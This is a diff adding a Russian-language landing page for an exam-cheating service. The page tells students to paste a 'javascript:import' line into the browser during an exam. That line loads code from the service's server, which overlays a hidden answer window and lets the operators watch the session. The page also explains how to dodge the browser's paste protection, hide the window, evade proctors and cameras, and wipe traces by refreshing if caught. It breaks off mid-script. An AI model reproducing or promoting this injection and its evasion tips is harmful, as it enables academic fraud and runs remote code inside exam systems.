@@ -1,0 +1,982 @@
+<!DOCTYPE html>
+<html lang="ru" data-theme="dark">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="darlingx/kimapr - премиальный сервис для успешной сдачи экзаменов">
+  
+  <!-- Предзагрузка критических ресурсов -->
+  <link rel="preload" href="/darlingx.css" as="style">
+  <link rel="preload" href="/theme.js" as="script">
+  
+  <link rel="stylesheet" href="/darlingx.css">
+  <script src="/theme.js" defer></script>
+  
+  <!-- Добавляем favicon -->
+  <link rel="icon" type="image/webp" href="/icon.webp">
+  <title>darlingx/zapomni</title>
+  
+  <!-- Добавляем стили с наивысшим приоритетом -->
+  <style>
+    body {
+      padding-top: 0 !important;
+      margin-top: 0 !important;
+    }
+
+    .navbar {
+      position: fixed !important;
+      top: 0 !important;
+      left: 0 !important;
+      right: 0 !important;
+      width: 100% !important;
+      z-index: 999999 !important;
+      transform: none !important;
+      background: var(--nav-bg) !important;
+      backdrop-filter: blur(10px) !important;
+      -webkit-backdrop-filter: blur(10px) !important;
+      border-bottom: 1px solid var(--border-color) !important;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05) !important;
+      height: 90px !important;
+      display: flex !important;
+      align-items: center !important;
+      padding: 0 60px !important;
+    }
+
+    .content-wrapper {
+      padding-top: 160px !important;
+      margin-top: 0 !important;
+      position: relative !important;
+      z-index: 1 !important;
+      transform: none !important;
+      width: 100% !important;
+      margin-left: 0 !important;
+    }
+
+    .header {
+      margin-top: 0 !important;
+      padding-top: 0 !important;
+    }
+
+    [data-theme="dark"] .navbar {
+      background: rgba(18, 18, 18, 0.95) !important;
+      border-bottom: 1px solid rgba(255, 215, 0, 0.1) !important;
+      box-shadow: 0 2px 15px rgba(0, 0, 0, 0.15) !important;
+    }
+
+    /* Стили для элементов внутри навбара */
+    .navbar .service-name {
+        font-size: 32px !important;
+    }
+
+    .navbar .menu-item {
+        font-size: 28px !important;
+    }
+
+    .navbar .simulation-button {
+        font-size: 28px !important;
+        padding: 12px 30px !important;
+        position: relative;
+        overflow: hidden;
+    }
+
+    .navbar .icon {
+        width: 60px !important;
+        height: 60px !important;
+    }
+
+    /* Добавляем стили для анимации текста кнопки симуляции */
+    .navbar .simulation-button a {
+        position: relative;
+        z-index: 2;
+        transition: color 0.3s ease-in-out;
+    }
+    
+    .navbar .simulation-button::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(45deg, #FFD700, #FFA500);
+        opacity: 0;
+        transition: opacity 0.3s ease-in-out;
+        z-index: 1;
+    }
+    
+    .navbar .simulation-button:hover::before,
+    .navbar .simulation-button:active::before {
+        opacity: 1;
+    }
+    
+    .navbar .simulation-button:hover a,
+    .navbar .simulation-button:active a {
+        color: #FFFFFF !important;
+        text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+    }
+    
+    /* Добавляем анимацию свечения при наведении */
+    @keyframes buttonGlow {
+        0% { box-shadow: 0 0 5px rgba(255, 215, 0, 0.3); }
+        50% { box-shadow: 0 0 15px rgba(255, 215, 0, 0.5); }
+        100% { box-shadow: 0 0 5px rgba(255, 215, 0, 0.3); }
+    }
+    
+    .navbar .simulation-button:hover {
+        animation: buttonGlow 2s infinite;
+    }
+
+    /* Мобильная версия */
+    @media screen and (max-width: 768px) {
+        .navbar .service-name {
+            font-size: 24px !important;
+        }
+
+        .navbar .menu-item {
+            font-size: 22px !important;
+        }
+
+        .navbar .simulation-button {
+            font-size: 22px !important;
+            padding: 10px 25px !important;
+        }
+
+        .navbar .icon {
+            width: 45px !important;
+            height: 45px !important;
+        }
+    }
+
+    .code-text {
+        cursor: pointer;
+        transition: color 0.3s ease;
+        color: #000; /* Черный цвет по умолчанию */
+        position: relative;
+    }
+    
+    [data-theme="dark"] .code-text {
+        color: #000; /* Черный цвет также в темной теме */
+    }
+    
+    .code-text.copied {
+        color: #000; /* Первая буква остается черной */
+    }
+    
+    .code-text.copied::after {
+        content: "Код скопирован";
+        position: absolute;
+        top: -60px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: rgba(0, 0, 0, 0.9);
+        color: white;
+        padding: 12px 24px;
+        border-radius: 12px;
+        font-size: 18px;
+        font-weight: 500;
+        letter-spacing: 0.8px;
+        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2),
+                    0 2px 8px rgba(0, 0, 0, 0.1);
+        backdrop-filter: blur(8px);
+        -webkit-backdrop-filter: blur(8px);
+        border: 1px solid rgba(255, 255, 255, 0.15);
+        animation: notificationFadeIn 0.3s cubic-bezier(0.4, 0, 0.2, 1), 
+                   notificationFadeOut 0.8s cubic-bezier(0.4, 0, 0.2, 1) forwards 1.2s;
+        white-space: nowrap;
+        z-index: 1000;
+    }
+    
+    .code-text.copied span:not(:first-child) {
+        color: white !important;
+    }
+    
+    @keyframes notificationFadeIn {
+        from {
+            opacity: 0;
+            transform: translate(-50%, 20px);
+        }
+        to {
+            opacity: 1;
+            transform: translate(-50%, 0);
+        }
+    }
+    
+    @keyframes notificationFadeOut {
+        from {
+            opacity: 1;
+            transform: translate(-50%, 0);
+        }
+        to {
+            opacity: 0;
+            transform: translate(-50%, -20px);
+        }
+    }
+
+    .particle {
+        position: fixed;
+        pointer-events: none;
+        width: 4px;
+        height: 4px;
+        background: rgba(255, 215, 0, 0.12);
+        border-radius: 50%;
+        box-shadow: 0 0 10px rgba(255, 215, 0, 0.15);
+        animation: floatParticle 20s linear infinite;
+        will-change: transform; /* Оптимизация производительности */
+    }
+
+    .particle:nth-child(2n) {
+        width: 5px;
+        height: 5px;
+        animation-duration: 25s;
+        animation-delay: -7s;
+    }
+
+    .particle:nth-child(3n) {
+        width: 3px;
+        height: 3px;
+        animation-duration: 30s;
+        animation-delay: -15s;
+    }
+
+    [data-theme="dark"] .particle {
+        background: rgba(255, 215, 0, 0.06);
+        box-shadow: 0 0 8px rgba(255, 215, 0, 0.1);
+    }
+
+    @keyframes floatParticle {
+        0% {
+            transform: translateY(100vh) translateX(0);
+            opacity: 0;
+        }
+        5% {
+            opacity: 0.4;
+        }
+        95% {
+            opacity: 0.4;
+        }
+        100% {
+            transform: translateY(-100vh) translateX(50px);
+            opacity: 0;
+        }
+    }
+
+    @media (max-width: 768px) {
+        .particle {
+            display: none; /* Отключаем на мобильных устройствах */
+        }
+    }
+
+    .constellation {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        pointer-events: none;
+        z-index: 0;
+    }
+
+    .star {
+        position: absolute;
+        width: 2px;
+        height: 2px;
+        background: rgba(255, 215, 0, 0.6);
+        border-radius: 50%;
+        box-shadow: 0 0 10px rgba(255, 215, 0, 0.4),
+                   0 0 20px rgba(255, 215, 0, 0.2);
+        animation: twinkle 4s infinite;
+        will-change: opacity, transform;
+        transition: top 15s ease-in-out, left 15s ease-in-out;
+    }
+
+    .star::after {
+        content: '';
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        width: 140%;
+        height: 140%;
+        background: radial-gradient(circle, rgba(255, 215, 0, 0.2) 0%, transparent 70%);
+        transform: translate(-50%, -50%);
+    }
+
+    .star:nth-child(2n) {
+        width: 3px;
+        height: 3px;
+        animation-duration: 6s;
+        animation-delay: -2s;
+    }
+
+    .star:nth-child(3n) {
+        width: 1.5px;
+        height: 1.5px;
+        animation-duration: 5s;
+        animation-delay: -4s;
+    }
+
+    .constellation-line {
+        position: absolute;
+        background: linear-gradient(90deg, 
+            transparent 0%, 
+            rgba(255, 215, 0, 0.1) 50%,
+            transparent 100%);
+        height: 1px;
+        transform-origin: left center;
+        animation: lineGlow 8s infinite;
+    }
+
+    @keyframes twinkle {
+        0%, 100% { opacity: 0.4; }
+        50% { opacity: 1; }
+    }
+
+    @keyframes lineGlow {
+        0%, 100% { opacity: 0.2; }
+        50% { opacity: 0.5; }
+    }
+
+    [data-theme="dark"] .star {
+        background: rgba(255, 215, 0, 0.9);
+        box-shadow: 0 0 20px rgba(255, 215, 0, 0.6),
+                    0 0 40px rgba(255, 215, 0, 0.3),
+                    0 0 60px rgba(255, 215, 0, 0.1);
+        transform-origin: center;
+        animation: twinkle 4s infinite, rotate 30s linear infinite;
+    }
+
+    /* Добавляем разные размеры для звезд */
+    [data-theme="dark"] .star:nth-child(1) { width: 5px; height: 5px; }
+    [data-theme="dark"] .star:nth-child(4) { width: 4.5px; height: 4.5px; }
+    [data-theme="dark"] .star:nth-child(7) { width: 5.5px; height: 5.5px; }
+    
+    [data-theme="dark"] .star:nth-child(2) { width: 3.5px; height: 3.5px; }
+    [data-theme="dark"] .star:nth-child(5) { width: 4px; height: 4px; }
+    [data-theme="dark"] .star:nth-child(8) { width: 3px; height: 3px; }
+    
+    [data-theme="dark"] .star:nth-child(3) { width: 2.5px; height: 2.5px; }
+    [data-theme="dark"] .star:nth-child(6) { width: 2px; height: 2px; }
+    [data-theme="dark"] .star:nth-child(9) { width: 1.8px; height: 1.8px; }
+
+    /* Обновляем свечение для разных размеров звезд */
+    [data-theme="dark"] .star:nth-child(1),
+    [data-theme="dark"] .star:nth-child(4),
+    [data-theme="dark"] .star:nth-child(7) {
+        box-shadow: 0 0 25px rgba(255, 215, 0, 0.7),
+                    0 0 45px rgba(255, 215, 0, 0.4),
+                    0 0 65px rgba(255, 215, 0, 0.2);
+    }
+    
+    [data-theme="dark"] .star:nth-child(2),
+    [data-theme="dark"] .star:nth-child(5),
+    [data-theme="dark"] .star:nth-child(8) {
+        box-shadow: 0 0 20px rgba(255, 215, 0, 0.6),
+                    0 0 35px rgba(255, 215, 0, 0.3),
+                    0 0 50px rgba(255, 215, 0, 0.1);
+    }
+    
+    [data-theme="dark"] .star:nth-child(3),
+    [data-theme="dark"] .star:nth-child(6),
+    [data-theme="dark"] .star:nth-child(9) {
+        box-shadow: 0 0 15px rgba(255, 215, 0, 0.5),
+                    0 0 25px rgba(255, 215, 0, 0.2),
+                    0 0 35px rgba(255, 215, 0, 0.1);
+    }
+
+    /* Обновляем размеры ореола для разных звезд */
+    [data-theme="dark"] .star:nth-child(1)::after,
+    [data-theme="dark"] .star:nth-child(4)::after,
+    [data-theme="dark"] .star:nth-child(7)::after {
+        width: 400%;
+        height: 400%;
+    }
+    
+    [data-theme="dark"] .star:nth-child(2)::after,
+    [data-theme="dark"] .star:nth-child(5)::after,
+    [data-theme="dark"] .star:nth-child(8)::after {
+        width: 300%;
+        height: 300%;
+    }
+    
+    [data-theme="dark"] .star:nth-child(3)::after,
+    [data-theme="dark"] .star:nth-child(6)::after,
+    [data-theme="dark"] .star:nth-child(9)::after {
+        width: 250%;
+        height: 250%;
+    }
+
+    /* Обновляем анимацию мерцания */
+    @keyframes twinkle {
+        0%, 100% { 
+            opacity: 0.8;
+            transform: scale(1);
+        }
+        50% { 
+            opacity: 1;
+            transform: scale(1.2);
+        }
+    }
+
+    /* Добавляем медленное вращение */
+    @keyframes rotate {
+        from { transform: rotate(0deg); }
+        to { transform: rotate(360deg); }
+    }
+
+    /* Обновляем стили для линий созвездий */
+    [data-theme="dark"] .constellation-line {
+        background: linear-gradient(90deg, 
+            transparent 0%, 
+            rgba(255, 215, 0, 0.15) 50%,
+            transparent 100%
+        );
+        height: 1px;
+        box-shadow: 0 0 15px rgba(255, 215, 0, 0.1);
+        opacity: 0.6;
+        transition: opacity 1s ease, transform 1s ease;
+    }
+
+    /* Добавляем класс для исчезающих линий */
+    [data-theme="dark"] .constellation-line.fading {
+        opacity: 0;
+        transform: scale(0.8);
+    }
+
+    /* Добавляем эффект при наведении на созвездие */
+    [data-theme="dark"] .constellation:hover .constellation-line {
+        opacity: 0.8;
+        box-shadow: 0 0 20px rgba(255, 215, 0, 0.2);
+    }
+
+    /* Добавляем плавное появление звезд */
+    [data-theme="dark"] .star {
+        opacity: 0;
+        animation: appear 1s ease forwards, twinkle 4s infinite;
+        transition: top 4s cubic-bezier(0.4, 0, 0.2, 1), 
+                   left 4s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    @keyframes appear {
+        from { opacity: 0; }
+        to { opacity: 1; }
+    }
+
+    /* Добавляем задержку появления для разных звезд */
+    [data-theme="dark"] .star:nth-child(2n) { animation-delay: 0.2s, 0s, 0s; }
+    [data-theme="dark"] .star:nth-child(3n) { animation-delay: 0.4s, 0s, 0s; }
+    [data-theme="dark"] .star:nth-child(4n) { animation-delay: 0.6s, 0s, 0s; }
+
+    /* Стили для светлой темы - гроза */
+    [data-theme="light"] .constellation {
+        display: none;
+    }
+
+    .lightning-container {
+        display: none;
+    }
+
+    /* Показываем созвездия только в темной теме */
+    .constellation {
+        display: none;
+    }
+
+    [data-theme="dark"] .constellation {
+        display: block;
+    }
+
+    /* Объединяем повторяющиеся медиа-запросы */
+    @media screen and (max-width: 768px) {
+        .navbar .service-name { font-size: 24px !important; }
+        .navbar .menu-item { font-size: 22px !important; }
+        .navbar .simulation-button { 
+            font-size: 22px !important;
+            padding: 10px 25px !important;
+        }
+        .navbar .icon {
+            width: 45px !important;
+            height: 45px !important;
+        }
+        .particle,
+        .constellation { display: none; }
+    }
+
+    /* Объединяем селекторы с одинаковыми свойствами */
+    .star:nth-child(2n),
+    .star:nth-child(3n) {
+        animation-duration: 6s;
+        animation-delay: -2s;
+    }
+
+    /* Используем короткие записи свойств */
+    .navbar {
+        inset: 0 0 auto 0 !important;
+        /* Заменяет top: 0, left: 0, right: 0 */
+    }
+
+    /* Оптимизируем анимации */
+    @keyframes notificationFade {
+        0% { opacity: 0; transform: translate(-50%, 20px); }
+        20% { opacity: 1; transform: translate(-50%, 0); }
+        80% { opacity: 1; transform: translate(-50%, 0); }
+        100% { opacity: 0; transform: translate(-50%, -20px); }
+    }
+
+    /* Заменяем две анимации на одну */
+    .code-text.copied::after {
+        animation: notificationFade 2s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+  </style>
+
+  <!-- Добавляем preconnect для внешних ресурсов -->
+  <link rel="preconnect" href="https://t.me">
+</head>
+<body>
+  <!-- Выносим навбар за пределы content-wrapper -->
+  <nav class="navbar">
+    <div class="logo-section">
+      <div class="icon">
+        <img src="icon.webp" alt="Логотип">
+      </div>
+      <div class="service-name">darLingx</div>
+    </div>
+    <div class="burger-menu">
+      <span class="burger-line"></span>
+      <span class="burger-line"></span>
+      <span class="burger-line"></span>
+    </div>
+    <ul class="menu">
+      <li class="menu-item">
+        <a href="https://t.me/+6KBIGPFmqTFhOTYy" target="_blank" rel="noopener">Отзывы</a>
+      </li>
+      <li class="menu-item">
+        <a href="https://t.me/zapomni1x" target="_blank" rel="noopener">Контакты</a>
+      </li>
+      <li class="menu-item">
+        <a href="https://t.me/rus_tuit" target="_blank" rel="noopener">Базы</a>
+      </li>
+      <li class="menu-item simulation-button">
+        <a href="https://t.me/Kimapr" target="_blank" rel="noopener">Симуляция</a>
+      </li>
+      <li class="theme-toggle" id="themeToggle">
+        <div class="theme-toggle-icon">
+          <svg class="sun" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M12 7c-2.76 0-5 2.24-5 5s2.24 5 5 5 5-2.24 5-5-2.24-5-5-5zM2 13h2c.55 0 1-.45 1-1s-.45-1-1-1H2c-.55 0-1 .45-1 1s.45 1 1 1zm18 0h2c.55 0 1-.45 1-1s-.45-1-1-1h-2c-.55 0-1 .45-1 1s.45 1 1 1zM11 2v2c0 .55.45 1 1 1s1-.45 1-1V2c0-.55-.45-1-1-1s-1 .45-1 1zm0 18v2c0 .55.45 1 1 1s1-.45 1-1v-2c0-.55-.45-1-1-1s-1 .45-1 1zM5.99 4.58c-.39-.39-1.03-.39-1.41 0-.39.39-.39 1.03 0 1.41l1.06 1.06c.39.39 1.03.39 1.41 0s.39-1.03 0-1.41L5.99 4.58zm12.37 12.37c-.39-.39-1.03-.39-1.41 0-.39.39-.39 1.03 0 1.41l1.06 1.06c.39.39 1.03.39 1.41 0 .39-.39.39-1.03 0-1.41l-1.06-1.06zm1.06-10.96c.39-.39.39-1.03 0-1.41-.39-.39-1.03-.39-1.41 0l-1.06 1.06c-.39.39-.39 1.03 0 1.41s1.03.39 1.41 0l1.06-1.06zM7.05 18.36c.39-.39.39-1.03 0-1.41-.39-.39-1.03-.39-1.41 0l-1.06 1.06c-.39.39-.39 1.03 0 1.41s1.03.39 1.41 0l1.06-1.06z"/>
+          </svg>
+          <svg class="moon" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M12 3c-4.97 0-9 4.03-9 9s4.03 9 9 9 9-4.03 9-9c0-.46-.04-.92-.1-1.36-.98 1.37-2.58 2.26-4.4 2.26-3.03 0-5.5-2.47-5.5-5.5 0-1.82.89-3.42 2.26-4.4-.44-.06-.9-.1-1.36-.1z"/>
+          </svg>
+        </div>
+      </li>
+    </ul>
+  </nav>
+
+  <div class="content-wrapper">
+    <!-- Весь существующий контент -->
+    <div class="constellation">
+        <div class="star" style="top: 15%; left: 20%"></div>
+        <div class="star" style="top: 25%; left: 35%"></div>
+        <div class="star" style="top: 40%; left: 25%"></div>
+        <div class="star" style="top: 60%; left: 40%"></div>
+        <div class="star" style="top: 75%; left: 30%"></div>
+        <div class="star" style="top: 20%; left: 70%"></div>
+        <div class="star" style="top: 35%; left: 80%"></div>
+        <div class="star" style="top: 55%; left: 75%"></div>
+        <div class="star" style="top: 70%; left: 85%"></div>
+    </div>
+
+    <!-- Добавляем элемент для анимации перехода -->
+    <div class="theme-transition"></div>
+
+    <!-- Оборачиваем контент, который нужно уменьшить -->
+    <div class="main-content">
+        <!-- Заголовок -->
+        <header class="header">
+            <h1 class="main-title">
+                Как использовать <span class="highlight">'darlingx.com'</span> на экзамене
+            </h1>
+            <p class="sub-title">(для получения помощи):</p>
+        </header>
+
+        <!-- Инструкции -->
+        <section class="exam-instructions">
+            <p>
+                <span class="exam-bold">После начала экзамена </span>
+                <span class="exam-italic">(ввода пароля)</span> 
+                <span class="exam-bold">в адресной строке вашего браузера введите следующий код:</span>
+            </p>
+            <div class="code-block">
+                <p class="code-text" id="codeText"><span>j</span><span>avascript:import("https://darlingx.com/xx")</span></p>
+            </div>
+            <p class="auto-copy-hint">автокопирование кода по двойному клику(лкм)</p>
+        </section>
+
+        <!-- Скриншоты -->
+        <section class="screenshots">
+            <img src="/screen of the simulation.webp" alt="Пример экрана 1" class="screenshot simulation">
+            <img src="/link photo.webp" alt="Пример экрана 2" class="screenshot link">
+        </section>
+
+        <!-- Описание окна "Любимый" -->
+        <section class="favorite-description">
+            <p>
+                На экране появится специальное окно 
+                <span class="favorite-highlight">"Любимый"</span>, в котором вы сможете<br>
+                видеть ответы, полученные от нас.
+            </p>
+        </section>
+
+        <!-- Окно "Любимый" -->
+        <section class="favorite-window">
+            <img src="/window.webp" alt="Окно 'Любимый'" class="favorite-image">
+        </section>
+
+        <!-- Добавляем секцию с инструкциями по скрытию окна -->
+        <section class="hide-instructions">
+            <h2 class="hide-title">Чтобы скрыть это окно есть <span class="highlight-number">3</span> способа:</h2>
+            <ul class="hide-methods">
+                <li>нажмите правой кнопкой мыши на окно.</li>
+                <li>используйте сочетание клавиш <span class="key-combo arial-font">Shift + Z</span></li>
+                <li>используйте жест <span class="gesture-text">(видео-урок)</span></li>
+            </ul>
+            <p class="language-note">(при необходимости переключите клавиатуру на <span class="highlight-lang">английский язык</span>).</p>
+            
+            <!-- Добавляем схему жеста -->
+            <div class="gesture-scheme">
+                <img src="/gesture.webp" alt="Схема жеста" class="gesture-image">
+            </div>
+            
+            <!-- Добавляем предупреждение -->
+            <div class="warning-block">
+                <p class="warning-title">в экстренных случаях:</p>
+                <p class="warning-text">если вас заметили, незамедлительно обновите страницу (<span class="key-highlight">F5</span>)</p>
+                <p class="warning-text">или используйте другой метод для обновления страницы , это отключит код, и следов не останется.</p>
+            </div>
+
+            <!-- После блока warning-block добавляем новый блок с советами -->
+            <section class="tips-section">
+                <h2 class="tips-title">Советы для удобного использования кода на ИК</h2>
+                
+                <div class="tip-block">
+                    <h3 class="tip-header">📌 1. Подготовьте код заранее!</h3>
+                    <p class="tip-text">
+                        Скопируйте код до или во время раздачи паролей.<br>
+                        Где незаметно вписать код, чтобы потом быстро вставить?<br>
+                        <span class="tip-highlight">→ В строку поиска в ЛМС, где вы вводите фамилию перед вводом пароля.</span>
+                    </p>
+                </div>
+
+                <div class="tip-block">
+                    <h3 class="tip-header">📌 2. Как правильно копировать код?</h3>
+                    <p class="tip-text">
+                        <span class="tip-important">Важно!</span> Если вы копируете весь код полностью, javascript: не скопируется, и его придётся дописывать вручную.
+                    </p>
+                    <p class="tip-text">
+                        <span class="tip-success">✅ Как этого избежать?</span><br>
+                        Копируйте код не полностью, а пропустив первую букву "J", например:
+                    </p>
+                    <div class="code-examples">
+                        <p class="code-wrong">❌ javascript:import("https://#####.com/1xxxx")</p>
+                        <p class="code-correct">✅ avascript:import("https://#####.com/1xxxx")</p>
+                    </div>
+                    <p class="tip-text">
+                        Теперь при вставке вам останется дописать только одну букву "J" в начале, и код будет работать без проблем.
+                    </p>
+                </div>
+
+                <div class="tip-block">
+                    <h3 class="tip-header">📌 3. Проверяйте заметки в окне "Любимый"!</h3>
+                    <p class="tip-text">
+                        Все актуальные замечания и исправления появляются под словом "НОВОЕ".<br>
+                        Например:<br>
+                        <span class="tip-example">zp15: Ошибка! Ответ С (вместо выбранного вами).</span>
+                    </p>
+                </div>
+
+                <div class="tip-block">
+                    <h3 class="tip-header">📌 4. Выбирайте удобное и безопасное место 🪑</h3>
+                    <p class="tip-text">
+                        ✔️ Сядьте так, чтобы видеть всю аудиторию, слегка поворачивая голову, а не корпус. Это поможет контролировать передвижение проверяющих.
+                    </p>
+                    <p class="tip-text">
+                        ✔️ Избегайте рискованных мест:
+                    </p>
+                    <div class="tip-warning-list">
+                        <p>❌ Не садитесь спиной ко всему кабинету.</p>
+                        <p>❌ Не занимайте место около двери.</p>
+                        <p>❌ Не располагайтесь прямо под камерой, если монитор находится слишком близко к ней.</p>
+                    </div>
+                </div>
+
+                <div class="tip-block">
+                    <h3 class="tip-header">📌 5. Окно "Любимый" активно? Расслабьтесь и ждите ответы! 💡</h3>
+                    <div class="tip-success-list">
+                        <p>✔️ Если удалось активировать окно "Любимый", сохраняйте спокойствие.</p>
+                        <p>✔️ Делайте вид, что записываете что-то на листке, создавайте впечатление, что работаете.</p>
+                        <p>✔️ Ответы появляются по мере их решения – не торопитесь, просто ждите.</p>
+                        <p>✔️ Если окно активно – мы вас видим, отслеживаем таймер и отмечаем, какие ответы вы выбираете.</p>
+                    </div>
+                </div>
+
+                <div class="tip-block">
+                    <h3 class="tip-header">📌 6. Не делайте специально ошибок! ❌</h3>
+                    <div class="tip-success-list">
+                        <p>✔️ Не пытайтесь занижать баллы, чтобы "не привлекать внимание" – это не работает.</p>
+                        <p>✔️ Решайте на максимум! Чем выше балл – тем лучше.</p>
+                        <p>✔️ Помните: даже мы можем ошибиться, поэтому ваша внимательность играет ключевую роль.</p>
+                    </div>
+                </div>
+
+                <p class="tip-footer">
+                    <span class="tip-success">✅</span> Делайте всё правильно – и всё пройдёт гладко! 🚀✨
+                </p>
+            </section>
+        </section>
+    </div>
+  </div>
+
+  <script>
+    // В начало скрипта добавляем:
+    // Устанавливаем темную тему по умолчанию
+    document.documentElement.setAttribute('data-theme', 'dark');
+    
+    document.querySelector("#lmc").innerText = document.location.pathname.match(/\/([^/]*)\//)[1];
+  </script>
+
+  <!-- Футер вне .content-wrapper -->
+  <footer class="footer">
+    <div class="footer-content">
+        <div class="footer-section">
+            <div class="footer-logo">
+                <div class="icon">
+                    <img src="icon.webp" alt="Логотип">
+                </div>
+                <div class="service-name">darlingx/kimapr</div>
+            </div>
+            <p class="footer-description">
+                Премиальный сервис для тех, кто ценит качество и спокойствие. 
+                Мы предоставляем надежные решения для успешной сдачи экзаменов, 
+                обеспечивая безопасность и конфиденциальность каждому пользователю.
+            </p>
+        </div>
+        
+        <div class="footer-section">
+            <h3 class="footer-title">Контакты</h3>
+            <ul class="footer-links">
+                <li>Telegram: @zapomni1x</li>
+                <li>Phone: +998 (33) 696 69 15</li>
+                <li>Email: support@darlingx.com</li>
+            </ul>
+            <p class="footer-text">Время работы: 24/7</p>
+            <p class="footer-text">Среднее время ответа: 15 минут</p>
+        </div>
+        
+        <div class="footer-section">
+            <h3 class="footer-title">Информация</h3>
+            <ul class="footer-links">
+                <li><a href="https://t.me/+6KBIGPFmqTFhOTYy" target="_blank" rel="noopener" class="footer-link">О сервисе</a></li>
+                <li><a href="https://t.me/zapomni15termofuse" target="_blank" rel="noopener" class="footer-link">Условия использования</a></li>
+                <li><a href="https://t.me/zapomni15termofuse" target="_blank" rel="noopener" class="footer-link">Политика конфиденциальности</a></li>
+            </ul>
+            <p class="footer-text">
+                <a href="https://t.me/+6KBIGPFmqTFhOTYy" target="_blank" rel="noopener" class="footer-link">Гарантия безопасности</a>
+            </p>
+            <p class="footer-text">
+                <a href="https://t.me/zapomni1x" target="_blank" rel="noopener" class="footer-link">Техническая поддержка</a>
+            </p>
+        </div>
+    </div>
+    <div class="footer-bottom">
+        <p class="copyright">© 2024-2025 darlingx/kimapr . Все права защищены</p>
+    </div>
+  </footer>
+
+  <button class="scroll-to-top" aria-label="Прокрутить наверх"></button>
+
+  <script>
+    const codeText = document.getElementById('codeText');
+    
+    codeText.addEventListener('dblclick', function() {
+        const text = this.textContent;
+        const textToCopy = text.substring(1); // Копируем текст без первой буквы
+        
+        navigator.clipboard.writeText(textToCopy).then(() => {
+            // Добавляем класс для изменения цвета
+            this.classList.add('copied');
+            
+            // Убираем класс через 1 секунду
+            setTimeout(() => {
+                this.classList.remove('copied');
+            }, 1000);
+        });
+    });
+
+    // Обновляем функцию для смены созвездий
+    function changeConstellation() {
+        if (document.documentElement.getAttribute('data-theme') === 'dark') {
+            const stars = document.querySelectorAll('.star');
+            const lines = document.querySelectorAll('.constellation-line');
+            const constellation = constellations[currentConstellation];
+            
+            // Сначала скрываем линии
+            lines.forEach(line => {
+                line.classList.add('fading');
+            });
+            
+            // Через 1 секунду удаляем старые линии и перемещаем звезды
+            setTimeout(() => {
+                lines.forEach(line => line.remove());
+                
+                stars.forEach((star, index) => {
+                    if (constellation[index]) {
+                        star.style.top = `${constellation[index].top}%`;
+                        star.style.left = `${constellation[index].left}%`;
+                    }
+                });
+                
+                // Увеличиваем задержку перед созданием новых линий
+                setTimeout(() => {
+                    createConstellationLines();
+                }, 4000);
+            }, 1000);
+
+            currentConstellation = (currentConstellation + 1) % constellations.length;
+        }
+    }
+
+    // Обновляем функцию создания линий
+    function createConstellationLines() {
+        const constellation = document.querySelector('.constellation');
+        if (!constellation) return;
+        
+        const stars = [...constellation.querySelectorAll('.star')];
+        const fragment = document.createDocumentFragment();
+        
+        stars.slice(0, -1).forEach((star, index) => {
+            const nextStar = stars[index + 1];
+            const line = document.createElement('div');
+            line.className = 'constellation-line';
+            
+            const {left: x1, top: y1} = star.getBoundingClientRect();
+            const {left: x2, top: y2} = nextStar.getBoundingClientRect();
+            
+            const length = Math.hypot(x2 - x1, y2 - y1);
+            const angle = Math.atan2(y2 - y1, x2 - x1) * 180 / Math.PI;
+            
+            Object.assign(line.style, {
+                width: `${length}px`,
+                left: `${x1}px`,
+                top: `${y1}px`,
+                transform: `rotate(${angle}deg)`,
+                opacity: '0'  // Начинаем с прозрачной линии
+            });
+            
+            fragment.appendChild(line);
+        });
+        
+        constellation.appendChild(fragment);
+        
+        // Плавно показываем новые линии
+        setTimeout(() => {
+            const newLines = constellation.querySelectorAll('.constellation-line');
+            newLines.forEach(line => {
+                line.style.opacity = '0.6';
+            });
+        }, 50);
+    }
+
+    // Массив с координатами известных созвездий
+    const constellations = [
+        // 1. Большая Медведица
+        [
+            {top: 15, left: 20}, {top: 20, left: 25}, {top: 25, left: 30},
+            {top: 30, left: 35}, {top: 28, left: 40}, {top: 25, left: 45},
+            {top: 22, left: 50}
+        ],
+        // 2. Орион
+        [
+            {top: 40, left: 45}, {top: 35, left: 50}, {top: 45, left: 50},
+            {top: 50, left: 48}, {top: 55, left: 46}, {top: 42, left: 55},
+            {top: 38, left: 55}
+        ],
+        // 3. Кассиопея
+        [
+            {top: 60, left: 20}, {top: 65, left: 25}, {top: 70, left: 30},
+            {top: 75, left: 35}, {top: 80, left: 40}
+        ],
+        // 4. Лебедь
+        [
+            {top: 25, left: 65}, {top: 30, left: 60}, {top: 35, left: 55},
+            {top: 40, left: 50}, {top: 45, left: 45}, {top: 35, left: 50},
+            {top: 30, left: 52}
+        ],
+        // 5. Скорпион
+        [
+            {top: 70, left: 25}, {top: 65, left: 30}, {top: 60, left: 35},
+            {top: 55, left: 40}, {top: 50, left: 45}, {top: 45, left: 50},
+            {top: 43, left: 55}, {top: 42, left: 60}
+        ],
+        // 6. Лира
+        [
+            {top: 20, left: 40}, {top: 25, left: 42}, {top: 30, left: 44},
+            {top: 35, left: 46}, {top: 30, left: 48}
+        ],
+        // 7. Дракон
+        [
+            {top: 15, left: 75}, {top: 20, left: 70}, {top: 25, left: 65},
+            {top: 30, left: 70}, {top: 35, left: 75}, {top: 40, left: 70},
+            {top: 45, left: 65}
+        ],
+        // 8. Близнецы
+        [
+            {top: 50, left: 20}, {top: 45, left: 25}, {top: 40, left: 30},
+            {top: 35, left: 35}, {top: 40, left: 40}, {top: 45, left: 35},
+            {top: 50, left: 30}
+        ],
+        // 9. Персей
+        [
+            {top: 80, left: 60}, {top: 75, left: 65}, {top: 70, left: 70},
+            {top: 65, left: 75}, {top: 60, left: 70}, {top: 55, left: 65}
+        ],
+        // 10. Андромеда
+        [
+            {top: 30, left: 80}, {top: 35, left: 75}, {top: 40, left: 70},
